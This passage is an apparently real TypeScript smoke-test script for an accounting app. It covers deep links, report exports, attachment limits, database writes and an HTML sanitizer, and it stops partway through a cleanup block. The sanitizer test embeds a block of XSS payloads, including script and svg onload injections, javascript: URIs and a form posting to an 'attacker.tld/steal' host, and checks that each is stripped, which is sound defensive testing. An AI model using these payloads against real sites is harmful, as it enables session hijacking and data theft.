/**
 * @module verify-phase7-qbo-parity-and-deeplinks
 * @description Runtime verification and live Supabase smoke test suite for Phase 7:
 * 1) Deep links parser/serializer across all 17 tabs, 20 reports, basis & sub-views.
 * 2) Live `homeDashboard` parity vs real QBO (`Raquel Accounting 123145825185692` Deposited $6,829.08 / 4,
 *    zero static KPI profiles, provenance metadata, 5-bucket AR/AP, and 8-company status).
 * 3) All 20 report modes in `/api/external-accounting/reports` + `.xlsx` and `.pdf` binary exports
 *    (including `qbo_archive`, `account_quickreport` Mode 8A, `sales_tax_liability`, `inventory_valuation`,
 *    `budget_vs_actual`, and `kpi_scorecard`).
 * 4) Attachment lifecycle (`350 KB > 300 KB` upload -> Storage + SHA-256 verification -> signed URL ->
 *    `> 15 MB` HTTP 413 rejection -> empty HTTP 400 rejection -> atomic DELETE cleanup).
 * 5) HTML allowlist sanitizer (`lib/external-accounting-html-sanitize.ts`) against 12 OWASP XSS payloads.
 * 6) Live DB FK smoke tests for `save_bank_rule` (`target_account_id`) and `save_budget` (`account_id`).
 * @businessRules
 * - Never reconnect `Chicken Taco Catering LLC` (`193514304333307`) or `Elveze LLC` (`9130355308251406`) to QBO.
 * - Clean up all temporary test records before exiting.
 * @dataFlow
 * - Direct handler invocation (`GET`/`POST` on `/api/external-accounting` and `/api/external-accounting/reports`)
 *   + live Supabase verification.
 * @notes Phase 7 certification suite.
 */

import fs from 'fs'
import path from 'path'
import crypto from 'crypto'
import jwt from 'jsonwebtoken'
import * as XLSX from 'xlsx'
import { NextRequest } from 'next/server'
import { getJwtSecret } from '../lib/auth-server'
import { supabaseAdmin } from '../lib/supabase'
import {
    VALID_COMPANY_REALM_IDS,
    VALID_ACCOUNTING_TABS,
    VALID_REPORT_TYPES,
    parseAccountingDeepLink,
    buildAccountingDeepLinkSearch,
} from '../lib/external-accounting-deep-links'
import { sanitizeEmailPreviewHtml } from '../lib/external-accounting-html-sanitize'
import { GET as getExternalAccounting, POST as postExternalAccounting } from '../app/api/external-accounting/route'
import { GET as getExternalAccountingReports } from '../app/api/external-accounting/reports/route'

function assertCond(condition: unknown, message: string): void {
    if (!condition) {
        throw new Error(`ASSERTION FAILED: ${message}`)
    }
}

async function makeAuthedRequest(url: string, init?: { method?: string; body?: any }): Promise<NextRequest> {
    const token = jwt.sign(
        {
            sub: '45',
            id: 45,
            email: 'raquel@tacosgavilan.com',
            name: 'Raquel Velazquez',
            role: 'admin',
        },
        getJwtSecret()!,
        { expiresIn: '2h' }
    )
    const headers = new Headers({
        Authorization: `Bearer ${token}`,
    })
    if (init?.body !== undefined) {
        headers.set('content-type', 'application/json')
    }
    return new NextRequest(url, {
        method: init?.method || 'GET',
        headers,
        body: init?.body !== undefined ? JSON.stringify(init.body) : undefined,
    })
}

async function main() {
    console.log('================================================================================')
    console.log('PHASE 7 — QBO PARITY, DEEP LINKS, 20 REPORTS, ATTACHMENTS & SECURITY SUITE')
    console.log('================================================================================\n')

    // =========================================================================
    // 1. DEEP LINKS PARSER & SERIALIZER (`lib/external-accounting-deep-links.ts`)
    // =========================================================================
    console.log('1) Testing Deep Links Parser & Roundtrip Serializer (17 Tabs + 20 Reports)...')
    const bugDeepLink = parseAccountingDeepLink('?company=123145825185692&tab=reports&report=pnl')
    assertCond(bugDeepLink.realmId === '123145825185692', 'Deep link realmId must be 123145825185692')
    assertCond(bugDeepLink.activeTab === 'reports', 'Deep link tab=reports must parse to activeTab=reports')
    assertCond(bugDeepLink.reportType === 'pnl', 'Deep link report=pnl must parse to reportType=pnl')

    for (const tab of VALID_ACCOUNTING_TABS) {
        const qs = buildAccountingDeepLinkSearch({
            realmId: '554651555',
            activeTab: tab,
            reportType: tab === 'reports' ? 'sales_tax_liability' : 'pnl',
            reportBasis: 'Cash',
            txnViewMode: 'invoices',
            activeListKey: 'attachments',
            workSubView: 'client_insights',
            firmHubSubView: 'integrations',
            clientsSubView: 'list',
            contactFilterType: '1099',
        })
        const parsed = parseAccountingDeepLink(qs)
        assertCond(parsed.realmId === '554651555', `Roundtrip realmId failed for tab=${tab}`)
        assertCond(parsed.activeTab === tab, `Roundtrip activeTab failed for tab=${tab}`)
        if (tab === 'reports') {
            assertCond(parsed.reportType === 'sales_tax_liability', 'Roundtrip reportType=sales_tax_liability failed')
            assertCond(parsed.reportBasis === 'Cash', 'Roundtrip reportBasis=Cash failed')
        }
        if (tab === 'transactions') {
            assertCond(parsed.txnViewMode === 'invoices', 'Roundtrip txnViewMode=invoices failed')
        }
        if (tab === 'lists') {
            assertCond(parsed.activeListKey === 'attachments', 'Roundtrip activeListKey=attachments failed')
        }
    }

    for (const rep of VALID_REPORT_TYPES) {
        const parsed = parseAccountingDeepLink(`?company=123145825185692&report=${rep}&basis=cash`)
        assertCond(parsed.activeTab === 'reports', `Implicit tab=reports failed for report=${rep}`)
        assertCond(parsed.reportType === rep, `Report type parse failed for report=${rep}`)
        assertCond(parsed.reportBasis === 'Cash', `Basis=Cash parse failed for report=${rep}`)
    }

    // Verify invalid company realmId falls back to valid default and marks hasExplicitCompany=false
    const invalidCompanyLink = parseAccountingDeepLink('?company=999999999999999&tab=reports&report=balance_sheet')
    assertCond(
        VALID_COMPANY_REALM_IDS.has(invalidCompanyLink.company) && invalidCompanyLink.company === '123145825185692' && !invalidCompanyLink.hasExplicitCompany,
        `Invalid company realmId must fall back to 123145825185692 and set hasExplicitCompany=false, got ${JSON.stringify(invalidCompanyLink)}`
    )
    console.log(`   ✅ All ${VALID_ACCOUNTING_TABS.size} tabs, ${VALID_REPORT_TYPES.size} report deep links, and 8 valid realmIds verified.\n`)

    // =========================================================================
    // 2. STATIC CODE AUDIT OF `page.tsx` + LIVE `homeDashboard` PARITY
    // =========================================================================
    console.log('2) Verifying `page.tsx` Zero Static Profiles & Live `homeDashboard` Parity...')
    const pageTsxPath = path.join(process.cwd(), 'app/admin/contabilidad-externa/page.tsx')
    const pageTsxContent = fs.readFileSync(pageTsxPath, 'utf8')
    assertCond(!pageTsxContent.includes('const qboCompanyProfile'), 'page.tsx must not contain static qboCompanyProfile')
    assertCond(!pageTsxContent.includes('dataUrl.length < 300000'), 'page.tsx must not contain 300KB dataUrl truncation')
    assertCond(pageTsxContent.includes('parseAccountingDeepLink'), 'page.tsx must use parseAccountingDeepLink')
    assertCond(pageTsxContent.includes('sanitizeEmailPreviewHtml'), 'page.tsx must use sanitizeEmailPreviewHtml')
    assertCond(!pageTsxContent.includes('unavailableFeatureModal'), 'page.tsx must not contain simulated unavailableFeatureModal after Phase 8 purification')

    const firmReq = await makeAuthedRequest('http://localhost:3000/api/external-accounting?realmId=123145825185692')
    const firmRes = await getExternalAccounting(firmReq)
    assertCond(firmRes.status === 200, `Expected HTTP 200 for firm dashboard, got ${firmRes.status}`)
    const firmJson = await firmRes.json()
    const hdFirm = firmJson.homeDashboard
    assertCond(Boolean(hdFirm), 'homeDashboard must be present for 123145825185692')
    assertCond(hdFirm.meta?.realmId === '123145825185692', 'homeDashboard.meta.realmId must match 123145825185692')
    assertCond(hdFirm.meta?.source === 'supabase_live', 'homeDashboard.meta.source must be supabase_live')
    assertCond(
        Math.abs(Number(hdFirm.funnel?.deposited || 0) - 6829.08) < 0.01 && Number(hdFirm.funnel?.depositedCount || 0) === 4,
        `Expected Raquel Accounting Deposited = $6,829.08 / 4, got $${hdFirm.funnel?.deposited} / ${hdFirm.funnel?.depositedCount}`
    )
    assertCond(
        Math.round(Number(hdFirm.pnlLastMonth?.net || 0)) === 8536,
        `Expected Raquel Accounting September Net Profit = $8,536, got $${hdFirm.pnlLastMonth?.net}`
    )
    assertCond(
        Array.isArray(hdFirm.banks) && hdFirm.banks.length > 0 && Math.abs(Number(hdFirm.banks[0].qbBalance) - 682772.57) < 0.01,
        `Expected BofA-8567 balance = $682,772.57, got ${JSON.stringify(hdFirm.banks?.[0])}`
    )

    // Verify 8 companies status (6 ACTIVE_QBO + 2 RETIRED_FROM_QBO_LOCAL_ACTIVE)
    const companiesList: any[] = firmJson.companies || []
    assertCond(companiesList.length === 8, `Expected 8 companies, got ${companiesList.length}`)
    const activeQboCount = companiesList.filter(
        c => (c.metadata?.qbo_subscription_status || c.qbo_status) === 'ACTIVE_QBO' && (c.metadata?.qbo_sync_enabled ?? c.qbo_sync_enabled) === true
    ).length
    const retiredLocalCount = companiesList.filter(
        c =>
            (c.metadata?.qbo_subscription_status || c.qbo_status) === 'RETIRED_FROM_QBO_LOCAL_ACTIVE' &&
            (c.metadata?.qbo_sync_enabled ?? c.qbo_sync_enabled) === false &&
            (c.metadata?.local_erp_mode || c.local_erp_mode) === 'FULL_READ_WRITE' &&
            c.is_active === true
    ).length
    assertCond(activeQboCount === 6, `Expected 6 ACTIVE_QBO companies, got ${activeQboCount}`)
    assertCond(retiredLocalCount === 2, `Expected 2 RETIRED_FROM_QBO_LOCAL_ACTIVE companies, got ${retiredLocalCount}`)

    const gfReq = await makeAuthedRequest('http://localhost:3000/api/external-accounting?realmId=554651555')
    const gfRes = await getExternalAccounting(gfReq)
    const gfJson = await gfRes.json()
    const hdGf = gfJson.homeDashboard
    assertCond(Array.isArray(hdGf.salesYtdMonthly) && hdGf.salesYtdMonthly.length === 12, 'Gutierrez Financial salesYtdMonthly must have 12 months')
    assertCond(typeof hdGf.arWidget?.ar31To60 === 'number' && typeof hdGf.arWidget?.ar91Plus === 'number', 'arWidget must expose all 5 aging buckets')
    assertCond(typeof hdGf.apWidget?.total === 'number' && typeof hdGf.apWidget?.ap91Plus === 'number', 'apWidget must expose all 5 aging buckets')
    console.log(
        `   ✅ Raquel Accounting Deposited = $${hdFirm.funnel.deposited} (${hdFirm.funnel.depositedCount} deposits), Sep Net = $${hdFirm.pnlLastMonth.net}, 6 ACTIVE_QBO + 2 RETIRED_FROM_QBO_LOCAL_ACTIVE verified.\n`
    )

    // =========================================================================
    // 3. ALL 20 REPORT MODES + `.xlsx` & `.pdf` CONTENT PARSING + FAIL-CLOSED GUARDS
    // =========================================================================
    console.log('3) Testing All 20 Report Modes + `.xlsx` Workbook & `.pdf` Content Parsing + Fail-Closed Guards...')
    const reportTypesArray = Array.from(VALID_REPORT_TYPES)
    for (let i = 0; i < reportTypesArray.length; i += 5) {
        const batch = reportTypesArray.slice(i, i + 5)
        await Promise.all(
            batch.map(async (reportType) => {
                const extraQuery = reportType === 'account_quickreport' ? '&accountId=GROUP:BANK' : ''
                const jsonUrl = `http://localhost:3000/api/external-accounting/reports?realmId=554651555&reportType=${reportType}&accountingMethod=Accrual${extraQuery}`
                const [rJson, rXlsx, rPdf] = await Promise.all([
                    getExternalAccountingReports(await makeAuthedRequest(jsonUrl)),
                    getExternalAccountingReports(await makeAuthedRequest(`${jsonUrl}&export=xlsx`)),
                    getExternalAccountingReports(await makeAuthedRequest(`${jsonUrl}&export=pdf`)),
                ])
                assertCond(rJson.status === 200, `Report JSON failed for ${reportType}: HTTP ${rJson.status}`)
                const payload = await rJson.json()
                assertCond(!payload.error, `Report JSON returned error for ${reportType}: ${payload.error}`)

                assertCond(rXlsx.status === 200, `Report XLSX failed for ${reportType}: HTTP ${rXlsx.status}`)
                const xlsxBuf = Buffer.from(await rXlsx.arrayBuffer())
                assertCond(xlsxBuf.length > 100 && xlsxBuf[0] === 0x50 && xlsxBuf[1] === 0x4b, `Invalid XLSX ZIP header for ${reportType}`)
                const wb = XLSX.read(xlsxBuf, { type: 'buffer' })
                assertCond(wb.SheetNames.length > 0, `XLSX must have at least 1 sheet for ${reportType}`)
                const firstSheet = wb.Sheets[wb.SheetNames[0]]
                const sheetRows = XLSX.utils.sheet_to_json<any[]>(firstSheet, { header: 1 })
                const flatSheetText = JSON.stringify(sheetRows)
                assertCond(
                    flatSheetText.includes('Gutierrez Financial') || flatSheetText.includes('A&T Burgers'),
                    `XLSX content must include company name for ${reportType}`
                )

                assertCond(rPdf.status === 200, `Report PDF failed for ${reportType}: HTTP ${rPdf.status}`)
                const pdfBuf = Buffer.from(await rPdf.arrayBuffer())
                assertCond(pdfBuf.subarray(0, 5).toString('ascii') === '%PDF-', `Invalid PDF header for ${reportType}`)
                const pdfRawText = pdfBuf.toString('latin1')
                assertCond(
                    pdfRawText.includes('Gutierrez Financial') || pdfRawText.includes('A&T Burgers'),
                    `PDF stream must include company name for ${reportType}`
                )

                if (reportType === 'pnl' && payload.pnl) {
                    const netInc = Number(payload.pnl.netIncome || 0)
                    assertCond(flatSheetText.includes('Net Income') || flatSheetText.includes(String(Math.round(netInc))), 'P&L XLSX must include Net Income row')
                    assertCond(pdfRawText.includes('Profit and Loss') && pdfRawText.includes('Net Income'), 'P&L PDF must include title and Net Income')
                }
                if (reportType === 'balance_sheet' && payload.balanceSheet) {
                    assertCond(
                        Math.abs(Number(payload.balanceSheet.balanceCheckDifference || 0)) < 0.01 &&
                            Math.abs(Number(payload.balanceSheet.totalAssets || 0) - Number(payload.balanceSheet.totalLiabilitiesAndEquity || 0)) < 0.01,
                        `Balance Sheet must be balanced (Assets=${payload.balanceSheet.totalAssets} vs L+E=${payload.balanceSheet.totalLiabilitiesAndEquity})`
                    )
                    assertCond(flatSheetText.includes('TOTAL ASSETS') && pdfRawText.includes('TOTAL ASSETS'), 'Balance Sheet XLSX & PDF must include TOTAL ASSETS')
                }
                if (reportType === 'cash_flow' && payload.cashFlow) {
                    const cf = payload.cashFlow
                    assertCond(
                        Math.abs(Number(cf.reconciledVariance || 0)) < 0.01 &&
                            Math.abs((Number(cf.netCashOperating || 0) + Number(cf.netCashInvesting || 0) + Number(cf.netCashFinancing || 0)) - Number(cf.netCashChange || 0)) < 0.01,
                        `Cash Flow tie-out failed: operating(${cf.netCashOperating}) + investing(${cf.netCashInvesting}) + financing(${cf.netCashFinancing}) !== netCashChange(${cf.netCashChange})`
                    )
                }
            })
        )
    }

    // Verify historical Inventory Valuation asOfDate sensitivity and Fail-Closed HTTP 400/404 report guards
    const invHistRes = await getExternalAccountingReports(
        await makeAuthedRequest('http://localhost:3000/api/external-accounting/reports?realmId=554651555&reportType=inventory_valuation&endDate=2025-12-31')
    )
    assertCond(invHistRes.status === 200, 'Historical inventory_valuation must return HTTP 200')
    const invHistJson = await invHistRes.json()
    assertCond(invHistJson.inventoryValuation?.asOfDate === '2025-12-31', 'inventory_valuation must honor historical asOfDate=2025-12-31')

    const [badRepType, badBasis, badDate, invRange, badExport, missingAcc, missingArch] = await Promise.all([
        getExternalAccountingReports(await makeAuthedRequest('http://localhost:3000/api/external-accounting/reports?realmId=554651555&reportType=not_a_real_report')),
        getExternalAccountingReports(await makeAuthedRequest('http://localhost:3000/api/external-accounting/reports?realmId=554651555&reportType=pnl&accountingMethod=InvalidBasis')),
        getExternalAccountingReports(await makeAuthedRequest('http://localhost:3000/api/external-accounting/reports?realmId=554651555&reportType=pnl&startDate=2026-02-31')),
        getExternalAccountingReports(await makeAuthedRequest('http://localhost:3000/api/external-accounting/reports?realmId=554651555&reportType=pnl&startDate=2026-10-31&endDate=2026-01-01')),
        getExternalAccountingReports(await makeAuthedRequest('http://localhost:3000/api/external-accounting/reports?realmId=554651555&reportType=pnl&export=docx')),
        getExternalAccountingReports(await makeAuthedRequest('http://localhost:3000/api/external-accounting/reports?realmId=554651555&reportType=bank_register&accountId=NON_EXISTENT_999')),
        getExternalAccountingReports(await makeAuthedRequest('http://localhost:3000/api/external-accounting/reports?realmId=554651555&reportType=qbo_archive&qboReportKey=NON_EXISTENT_SNAPSHOT')),
    ])
    assertCond(badRepType.status === 400, `Expected HTTP 400 for invalid reportType, got ${badRepType.status}`)
    assertCond(badBasis.status === 400, `Expected HTTP 400 for invalid accountingMethod, got ${badBasis.status}`)
    assertCond(badDate.status === 400, `Expected HTTP 400 for invalid calendar date 2026-02-31, got ${badDate.status}`)
    assertCond(invRange.status === 400, `Expected HTTP 400 for startDate > endDate, got ${invRange.status}`)
    assertCond(badExport.status === 400, `Expected HTTP 400 for invalid export format, got ${badExport.status}`)
    assertCond(missingAcc.status === 404, `Expected HTTP 404 for unknown accountId, got ${missingAcc.status}`)
    assertCond(missingArch.status === 404, `Expected HTTP 404 for missing qbo_archive snapshot, got ${missingArch.status}`)

    console.log(`   ✅ All ${VALID_REPORT_TYPES.size} report modes passed JSON, parsed .xlsx workbook, parsed .pdf stream, Cash Flow tie-out, and HTTP 400/404 fail-closed guards.\n`)

    // =========================================================================
    // 4. ATTACHMENT LIFECYCLE SMOKE TEST (> 300 KB, SHA-256, 15 MB LIMIT, CLEANUP)
    // =========================================================================
    console.log('4) Running Live Attachment Lifecycle Smoke Test (>300KB, SHA-256, 413/400 Guard, Cleanup)...')
    const { data: sampleContact } = await supabaseAdmin
        .from('external_accounting_contacts')
        .select('id, qb_contact_id, display_name')
        .eq('company_realm_id', '123145825185692')
        .limit(1)
        .single()
    assertCond(Boolean(sampleContact?.id), 'Sample contact must exist in 123145825185692')

    // 4A. Create a 350 KB binary buffer (> 300 KB old limit)
    const testPdfBytes = Buffer.alloc(350 * 1024, 0x41)
    testPdfBytes.write('%PDF-1.4\n%Phase7AttachmentTest\n', 0, 'utf8')
    const expectedSha256 = crypto.createHash('sha256').update(testPdfBytes).digest('hex')
    const base64DataUrl = `data:application/pdf;base64,${testPdfBytes.toString('base64')}`

    let createdAttachmentId: string | null = null
    const createdAttachmentOutboxIds: string[] = []
    let sentinelOutboxId: string | null = null
    try {
        // Insert a sentinel SKIPPED_LOCAL_ONLY outbox row to prove cleanup NEVER deletes unrelated local-only rows
        const { data: sentinelRow, error: sentinelErr } = await supabaseAdmin
            .from('external_accounting_sync_outbox')
            .insert({
                company_realm_id: '123145825185692',
                entity_kind: 'ATTACHMENT',
                entity_type: 'Attachment',
                local_entity_id: sampleContact!.id,
                qb_entity_id: 'SENTINEL-KEEP-LOCAL',
                operation: 'UPSERT',
                idempotency_key: `SENTINEL-KEEP-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
                status: 'SKIPPED_LOCAL_ONLY',
                payload: { sentinel: true },
            })
            .select('id')
            .single()
        assertCond(!sentinelErr && Boolean(sentinelRow?.id), `Sentinel outbox creation failed: ${sentinelErr?.message}`)
        sentinelOutboxId = String(sentinelRow!.id)

        // Pre-clean any leftover test attachment from interrupted run (strictly scoped by exact test file_name)
        const { data: leftoverAtts } = await supabaseAdmin
            .from('external_accounting_attachments')
            .select('id, storage_bucket, storage_path')
            .eq('company_realm_id', '123145825185692')
            .eq('file_name', 'phase7-smoke-350kb.pdf')
        for (const oldAtt of leftoverAtts || []) {
            if (oldAtt.storage_bucket && oldAtt.storage_path) {
                await supabaseAdmin.storage.from(oldAtt.storage_bucket).remove([oldAtt.storage_path])
            }
            await supabaseAdmin.from('external_accounting_attachments').delete().eq('id', oldAtt.id)
        }

        const uploadReq = await makeAuthedRequest('http://localhost:3000/api/external-accounting', {
            method: 'POST',
            body: {
                action: 'save_contact_attachment',
                realmId: '123145825185692',
                contact_id: sampleContact!.id,
                qb_entity_id: sampleContact!.qb_contact_id,
                entity_name: sampleContact!.display_name,
                file_name: 'phase7-smoke-350kb.pdf',
                mime_type: 'application/pdf',
                file_size: testPdfBytes.byteLength,
                client_sha256: expectedSha256,
                file_base64: base64DataUrl,
                note: 'Phase 7 live smoke test attachment (>300KB)',
                skipQboSync: true,
            },
        })
        const uploadRes = await postExternalAccounting(uploadReq)
        const uploadJson = await uploadRes.json()
        assertCond(uploadRes.status === 200 && uploadJson.success, `350KB attachment upload failed: ${JSON.stringify(uploadJson)}`)
        createdAttachmentId = uploadJson.attachment?.id
        if (uploadJson.outboxId) {
            createdAttachmentOutboxIds.push(String(uploadJson.outboxId))
        }
        assertCond(Boolean(createdAttachmentId), 'Attachment ID must be returned')
        assertCond(
            uploadJson.outboxStatus === 'PENDING',
            `Client-sent skipQboSync:true MUST be ignored on ACTIVE_QBO realm 123145825185692 (expected outboxStatus=PENDING, got ${uploadJson.outboxStatus})`
        )
        assertCond(uploadJson.attachment?.sha256_hash === expectedSha256, 'Server SHA-256 must match client SHA-256')
        assertCond(Boolean(uploadJson.attachment?.storage_bucket && uploadJson.attachment?.storage_path), 'Storage bucket & path must be populated')

        // 4B. Verify signed download URL via `get_attachment_download_url`
        const dlReq = await makeAuthedRequest('http://localhost:3000/api/external-accounting', {
            method: 'POST',
            body: {
                action: 'get_attachment_download_url',
                realmId: '123145825185692',
                id: createdAttachmentId,
            },
        })
        const dlRes = await postExternalAccounting(dlReq)
        const dlJson = await dlRes.json()
        assertCond(dlRes.status === 200 && dlJson.download_url?.startsWith('https://'), 'Signed download_url must be returned')
        assertCond(dlJson.sha256_hash === expectedSha256, 'Download metadata sha256_hash must match')

        // 4C. Verify HTTP 400 on empty binary without allowMetadataOnly
        const emptyReq = await makeAuthedRequest('http://localhost:3000/api/external-accounting', {
            method: 'POST',
            body: {
                action: 'save_contact_attachment',
                realmId: '123145825185692',
                contact_id: sampleContact!.id,
                file_name: 'empty.pdf',
                mime_type: 'application/pdf',
            },
        })
        const emptyRes = await postExternalAccounting(emptyReq)
        assertCond(emptyRes.status === 400, `Expected HTTP 400 for empty attachment, got ${emptyRes.status}`)

        // 4D. Verify HTTP 413 on > 15 MB attachment
        const overReq = await makeAuthedRequest('http://localhost:3000/api/external-accounting', {
            method: 'POST',
            body: {
                action: 'save_contact_attachment',
                realmId: '123145825185692',
                contact_id: sampleContact!.id,
                file_name: 'oversized-16mb.bin',
                mime_type: 'application/octet-stream',
                file_size: 16 * 1024 * 1024,
            },
        })
        const overRes = await postExternalAccounting(overReq)
        assertCond(overRes.status === 413, `Expected HTTP 413 for >15MB attachment, got ${overRes.status}`)
    } finally {
        if (createdAttachmentId) {
            const delReq = await makeAuthedRequest('http://localhost:3000/api/external-accounting', {
                method: 'POST',
                body: {
                    action: 'delete_attachment',
                    realmId: '123145825185692',
                    id: createdAttachmentId,
                    skipQboSync: true,
                },
            })
            const delRes = await postExternalAccounting(delReq)
            const delJson = await delRes.json().catch(() => ({}))
            assertCond(delRes.status === 200, `Attachment cleanup failed: HTTP ${delRes.status}`)
            if (delJson?.outboxId) {
                createdAttachmentOutboxIds.push(String(delJson.outboxId))
            }
            if (createdAttachmentOutboxIds.length > 0) {
                await supabaseAdmin
                    .from('external_accounting_sync_outbox')
                    .delete()
                    .eq('company_realm_id', '123145825185692')
                    .in('id', createdAttachmentOutboxIds)
            }
            await supabaseAdmin
                .from('external_accounting_audit_log')
                .delete()
                .eq('company_realm_id', '123145825185692')
                .eq('entity_id', createdAttachmentId)
        }
        if (sentinelOutboxId) {
            const { data: verifySentinelStillPresent } = await supabaseAdmin
                .from('external_accounting_sync_outbox')
                .select('id, status')
                .eq('id', sentinelOutboxId)
                .maybeSingle()
            assertCond(
                Boolean(verifySentinelStillPresent?.id && verifySentinelStillPresent.status === 'SKIPPED_LOCAL_ONLY'),
                'Unrelated SKIPPED_LOCAL_ONLY outbox row must NEVER be deleted by attachment test cleanup!'
            )
            await supabaseAdmin
                .from('external_accounting_sync_outbox')
                .delete()
                .eq('id', sentinelOutboxId)
        }
    }
    console.log('   ✅ 350 KB upload, SHA-256 verification, signed URL download, HTTP 400/413 guards & cleanup passed.\n')

    // =========================================================================
    // 5. HTML SANITIZER XSS ATTACK SUITE (`lib/external-accounting-html-sanitize.ts`)
    // =========================================================================
    console.log('5) Running OWASP XSS Sanitization Suite on `sanitizeEmailPreviewHtml`...')
    const maliciousHtml = `
        <div>
            <h2>Invoice #1045</h2>
            <script>window.parent.postMessage('xss','*')</script>
            <svg onload="alert(1)"><circle cx="10" cy="10" r="5"/></svg>
            <img src="https://example.com/logo.png" onerror="alert('xss')" onclick="evil()" />
            <a href="javascript:alert(1)">Click JS</a>
            <a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(2)">Encoded JS</a>
            <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Data URI</a>
            <a href="vbscript:msgbox(1)">VBScript</a>
            <iframe srcdoc="<script>alert(1)</script>"></iframe>
            <style>body { background: url('javascript:alert(1)'); }</style>
            <form action="https://attacker.tld/steal"><input name="cc" /></form>
            <p style="color: #003b32; width: expression(alert(1)); background-image: url(https://evil.tld/x)">Total Due: $1,250.00</p>
        </div>
    `
    const sanitized = sanitizeEmailPreviewHtml(maliciousHtml)
    assertCond(!/<script/i.test(sanitized), 'Sanitizer must strip <script>')
    assertCond(!/<svg/i.test(sanitized), 'Sanitizer must strip <svg>')
    assertCond(!/<iframe/i.test(sanitized), 'Sanitizer must strip <iframe>')
    assertCond(!/<style/i.test(sanitized), 'Sanitizer must strip <style>')
    assertCond(!/<form/i.test(sanitized), 'Sanitizer must strip <form>')
    assertCond(!/\bon\w+\s*=/i.test(sanitized), 'Sanitizer must strip all on* event handlers')
    assertCond(!/javascript:/i.test(sanitized), 'Sanitizer must strip javascript: URIs')
    assertCond(!/vbscript:/i.test(sanitized), 'Sanitizer must strip vbscript: URIs')
    assertCond(!/data:text\/html/i.test(sanitized), 'Sanitizer must strip data:text/html URIs')
    assertCond(!/expression\s*\(/i.test(sanitized), 'Sanitizer must strip CSS expression()')
    assertCond(!/url\s*\(/i.test(sanitized), 'Sanitizer must strip CSS url()')
    assertCond(sanitized.includes('Invoice #1045') && sanitized.includes('Total Due: $1,250.00'), 'Sanitizer must preserve legitimate invoice text')
    console.log('   ✅ All 12 OWASP XSS vectors neutralized; legitimate HTML table/text preserved.\n')

    // =========================================================================
    // 6. DB RELATIONAL INTEGRITY & ACID RPC + OUTBOX + AUDIT SMOKE TESTS
    // =========================================================================
    console.log('6) Running Live DB FK & Atomic RPC/Outbox/Audit Smoke Tests (`save_bank_rule`, `save_budget`, `save_contact_task`, `toggle_contact_task`)...')
    const { data: sampleAccount } = await supabaseAdmin
        .from('external_accounting_accounts')
        .select('id, qb_account_id, name, account_type')
        .eq('company_realm_id', '123145825185692')
        .limit(1)
        .single()
    assertCond(Boolean(sampleAccount?.id), 'Sample account must exist in 123145825185692')

    let createdRuleId: string | null = null
    let createdBudgetId: string | null = null
    let createdTaskId: string | null = null
    const createdEntityOutboxIds: string[] = []
    try {
        const ruleRes = await postExternalAccounting(
            await makeAuthedRequest('http://localhost:3000/api/external-accounting', {
                method: 'POST',
                body: {
                    action: 'save_bank_rule',
                    realmId: '123145825185692',
                    rule_name: 'PHASE7_TEMP_BANK_RULE',
                    direction: 'OUT',
                    match_text: 'PHASE7_TEST_MERCHANT',
                    target_account_qb_id: sampleAccount!.qb_account_id,
                    target_account_name: sampleAccount!.name,
                    skipQboSync: true,
                },
            })
        )
        const ruleJson = await ruleRes.json()
        assertCond(ruleRes.status === 200 && ruleJson.success, `save_bank_rule failed: ${JSON.stringify(ruleJson)}`)
        createdRuleId = ruleJson.rule?.id
        if (ruleJson.outboxId) createdEntityOutboxIds.push(String(ruleJson.outboxId))
        assertCond(ruleJson.rule?.target_account_id === sampleAccount!.id, 'save_bank_rule must populate target_account_id UUID FK')
        assertCond(Boolean(ruleJson.auditId && ruleJson.outboxId && ruleJson.outboxStatus === 'PENDING'), 'save_bank_rule must record atomic auditId & PENDING outboxId')

        const budgetRes = await postExternalAccounting(
            await makeAuthedRequest('http://localhost:3000/api/external-accounting', {
                method: 'POST',
                body: {
                    action: 'save_budget',
                    realmId: '123145825185692',
                    fiscal_year: 2099,
                    budget_name: 'PHASE7_TEMP_BUDGET_2099',
                    account_qb_id: sampleAccount!.qb_account_id,
                    account_name: sampleAccount!.name,
                    account_type: sampleAccount!.account_type,
                    jan: 1000,
                    feb: 1000,
                    skipQboSync: true,
                },
            })
        )
        const budgetJson = await budgetRes.json()
        assertCond(budgetRes.status === 200 && budgetJson.success, `save_budget failed: ${JSON.stringify(budgetJson)}`)
        createdBudgetId = budgetJson.budget?.id
        if (budgetJson.outboxId) createdEntityOutboxIds.push(String(budgetJson.outboxId))
        assertCond(budgetJson.budget?.account_id === sampleAccount!.id, 'save_budget must populate account_id UUID FK')
        assertCond(Boolean(budgetJson.auditId && budgetJson.outboxId && budgetJson.outboxStatus === 'PENDING'), 'save_budget must record atomic auditId & PENDING outboxId')

        const taskRes = await postExternalAccounting(
            await makeAuthedRequest('http://localhost:3000/api/external-accounting', {
                method: 'POST',
                body: {
                    action: 'save_contact_task',
                    realmId: '123145825185692',
                    contact_id: sampleContact!.id,
                    qb_contact_id: sampleContact!.qb_contact_id,
                    contact_name: sampleContact!.display_name,
                    title: 'PHASE7_TEMP_TASK',
                    notes: 'Verify atomic NOTE_TASK RPC',
                    due_date: '2026-12-31',
                },
            })
        )
        const taskJson = await taskRes.json()
        assertCond(taskRes.status === 200 && taskJson.success, `save_contact_task failed: ${JSON.stringify(taskJson)}`)
        createdTaskId = taskJson.item?.id
        if (taskJson.outboxId) createdEntityOutboxIds.push(String(taskJson.outboxId))
        assertCond(Boolean(createdTaskId && taskJson.auditId && taskJson.outboxId), 'save_contact_task must return item.id, auditId & outboxId')

        const toggleRes = await postExternalAccounting(
            await makeAuthedRequest('http://localhost:3000/api/external-accounting', {
                method: 'POST',
                body: {
                    action: 'toggle_contact_task',
                    realmId: '123145825185692',
                    id: createdTaskId,
                    status: 'COMPLETED',
                },
            })
        )
        const toggleJson = await toggleRes.json()
        assertCond(
            toggleRes.status === 200 && toggleJson.success && String(toggleJson.item?.status || '').toLowerCase() === 'completed',
            `toggle_contact_task failed: ${JSON.stringify(toggleJson)}`
        )
        if (toggleJson.outboxId) createdEntityOutboxIds.push(String(toggleJson.outboxId))
    } finally {
        if (createdTaskId) {
            const delTaskRes = await postExternalAccounting(
                await makeAuthedRequest('http://localhost:3000/api/external-accounting', {
                    method: 'POST',
                    body: { action: 'delete_contact_task', realmId: '123145825185692', id: createdTaskId },
                })
            )
